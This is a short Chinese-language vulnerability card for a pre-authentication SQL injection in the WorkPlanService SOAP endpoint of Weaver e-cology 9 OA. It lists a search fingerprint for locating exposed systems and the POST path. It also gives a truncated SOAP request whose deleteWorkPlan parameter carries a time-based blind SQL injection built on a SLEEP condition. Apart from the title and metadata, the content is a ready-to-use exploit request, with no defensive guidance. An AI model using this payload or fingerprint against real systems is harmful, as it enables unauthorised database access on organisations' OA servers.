# 泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology 9.0 OA"`
- **请求**：`POST /services/WorkPlanService HTTP/1.1`
- **关键头**：`Content-Length: 430`

**请求体 / payload**
```
(KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,i
mage/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host: 192.168.52.168
Cookie: ecology_JSessionid=aaawzto5mqug94J9Fz0cz
<soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
<soapenv:Header/>
<soapenv:Body>
<web:deleteWorkPlan>
<!--type: string-->
<web:in0>(SELECT 8544 FROM
(SELECT(SLEEP(3-(IF(27=27,0,5)))))NZeo)</web:in0>
<!--type: int…（脚本共 683 字，完整版见原文）
```
- **预期**：200　|　—